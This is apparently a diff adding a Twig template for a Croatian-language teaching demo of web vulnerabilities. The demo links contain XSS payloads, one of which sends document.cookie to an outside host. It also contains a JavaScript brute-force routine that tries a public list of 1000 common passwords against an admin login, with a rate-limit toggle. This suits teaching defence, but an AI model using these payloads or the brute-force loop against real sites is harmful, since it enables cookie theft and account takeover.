@@ -1,0 +1,145 @@
+{% extends 'base.html.twig' %}
+
+{% block title %}Welcome!{% endblock %}
+
+{% block body %}
+    <style>
+        :root {
+            --body-background: #fff;
+            --text-color: #3f3f46;
+            --link-color: #2563eb;
+            --logo-separator-color: #d4d4d8;
+            --code-background: #eee;
+        }
+        @media (prefers-color-scheme: dark) {
+            :root {
+                --body-background: #27272a;
+                --text-color: #e4e4e7;
+                --link-color: #60a5fa;
+                --logo-separator-color: #71717a;
+                --code-background: #111;
+            }
+        }
+        body {
+            background-color: var(--body-background);
+            background-image: url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' width='4' height='4' viewBox='0 0 4 4'%3E%3Cpath fill='%23F4F4F5' fill-opacity='0.4' d='M1 3h1v1H1V3zm2-2h1v1H3V1z'%3E%3C/path%3E%3C/svg%3E");
+            color: var(--text-color);
+            font: 16px/1.5 sans-serif;
+        }
+        .welcome-wrapper { margin: 3rem 1rem; }
+        .welcome-wrapper .logos { display: flex; align-items: center; margin-bottom: 1rem; }
+        .welcome-wrapper .symfony-logo { border-right: 1px solid var(--logo-separator-color); padding-right: 25px; }
+        .welcome-wrapper .platformsh-logo { margin-left: 30px; position: relative; top: -1px; }
+        .welcome-wrapper .symfony-logo svg { height: auto; width: 145px; }
+        .welcome-wrapper .platformsh-logo svg { height: auto; width: 140px; }
+        .welcome-wrapper .symfony-logo .symfony-logo-brandmark,
+        .welcome-wrapper .symfony-logo .symfony-logo-wordmark { fill: var(--text-color); }
+        .welcome-wrapper .symfony-logo .symfony-logo-brandmark-text { fill: var(--body-background); }
+        .welcome-wrapper .platformsh-logo .platformsh-logo-brandmark,
+        .welcome-wrapper .platformsh-logo .platformsh-logo-wordmark { fill: var(--text-color); }
+        .welcome-wrapper h1 { font-size: 21px; line-height: 1.2; margin-bottom: 1.5rem; }
+        .welcome-wrapper ul { padding-left: 1.5rem; }
+        .welcome-wrapper li { margin-top: .5rem; }
+        .welcome-wrapper a { color: var(--link-color); text-decoration: none; }
+        .welcome-wrapper a:hover { text-decoration: underline; }
+        .welcome-wrapper code { background-color: var(--code-background); padding: 0.2rem 0.4rem; }
+        @media (min-width: 992px) {
+            .welcome-wrapper { margin: 3rem; }
+            .welcome-wrapper h1 { font-size: 24px; letter-spacing: -0.01rem; }
+            .welcome-wrapper ul { padding-left: 2.5rem; }
+            .welcome-wrapper .logos { margin-bottom: 2rem; }
+            .welcome-wrapper .symfony-logo svg { height: auto; width: 175px; }
+            .welcome-wrapper .platformsh-logo svg { height: auto; width: 170px; }
+        }
+        @media (prefers-color-scheme: dark) {
+            body { background-image: url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' width='4' height='4' viewBox='0 0 4 4'%3E%3Cpath fill='%233F3F46' fill-opacity='0.4' d='M1 3h1v1H1V3zm2-2h1v1H3V1z'%3E%3C/path%3E%3C/svg%3E");}
+        }
+    </style>
+
+
+    <h1>Dobrodošli</h1>
+    <h2>1. XSS</h2>
+    <p>Unesite svoje ime: </p>
+    <form action="{{ path('xss_page') }}" method="get">
+        <input id="name" name="name" placeholder="Ime"><br>
+        <input type="checkbox" id="xss-safe" name="xss-safe" value="true">
+        <label for="xss-safe">Osiguran od XSS napada?</label><br>
+
+        <input type="submit" value="Submit">
+    </form>
+
+    <h3>Primjer linka:</h3>
+    <ul>
+        <li>
+            <a href="/welcome?name=%3Cscript%3Edocument.location.href%3D%27http%3A%2F%2Fwww.hr%3Fmarintest%3D%27%2Bdocument.cookie%3B%3C%2Fscript%3E">
+                /welcome?name=%3Cscript%3Edocument.location.href%3D%27http%3A%2F%2Fwww.hr%3Fmarintest%3D%27%2Bdocument.cookie%3B%3C%2Fscript%3E
+            </a>
+        </li>
+        <li>
+            <a href="/welcome?name=%3Cscript%3Ealert%28document.cookie%29%3C%2Fscript%3E">
+                /welcome?name=%3Cscript%3Ealert%28document.cookie%29%3C%2Fscript%3E
+            </a>
+        </li>
+    </ul>
+
+    <h2>2. Loša autentifikacija</h2>
+    <input type="checkbox" id="enableRateLimit" name="enableRateLimit" value=1>
+    <label for="enableRateLimit">Uključi rate limiter?</label><br>
+    <button id="button" type="button">Start brute force</button>
+    <br>
+    <br>
+
+    <button id="button-2" type="button">Reset rate limiter</button>
+    <br>
+    <p>Otvorite konzolu za praćenje napretka</p>
+    <p>Program iterira po nizu od 1000 zaporki i pokušava se sa svakom 'ulogirati' kao admin</p>
+    <script>
+        document.getElementById('button').addEventListener('click',
+            function startBruteForce() {
+                console.log("Starting brute force");
+
+                let enableRateLimit = document.querySelector('#enableRateLimit').checked;
+
+                let xmlHttp = new XMLHttpRequest();
+                xmlHttp.open( "GET", "https://raw.githubusercontent.com/DavidWittman/wpxmlrpcbrute/master/wordlists/1000-most-common-passwords.txt", false );
+                xmlHttp.send( null );
+                let passwordList = xmlHttp.responseText.split("\n");
+
+                let baseUrl = "{{ path('login_page') }}?username=admin";
+                if(enableRateLimit === true) {
+                    baseUrl += "&enableRateLimit=1"
+                }
+                baseUrl += "&password=";
+
+                for (let i = 0; i < passwordList.length; i++) {
+                    let currentPassword = passwordList[i];
+                    let url = baseUrl + currentPassword
+                    let httpLogin = new XMLHttpRequest();
+                    httpLogin.open("GET", url, false);
+                    httpLogin.send(null);
+
+                    let statusCode = httpLogin.status
+
+                    if(statusCode === 200) { // OK
+                        console.log("Successful login after " + (i+1) + " tries.");
+                        console.log("Correct password for username 'admin' is '" + currentPassword + "'")
+                        break;
+                    } else if (statusCode === 401) { // Unauthorized
+                        console.log("Login failed. Number of tries: " + (i+1));
+                    } else if (statusCode === 429) { // Too Many Requests
+                        console.log("Response status: 429 Too Many Requests. Stopping brute force...");
+                        break;
+                    }
+                }
+            }
+        )
+
+        document.getElementById('button-2').addEventListener('click',
+            function resetRateLimiter() {
+                let httpLogin = new XMLHttpRequest();
+                httpLogin.open("POST", "{{ path('reset_rate_limiter') }}", false);
+                httpLogin.send(null);
+            }
+        )
+    </script>
+{% endblock %}
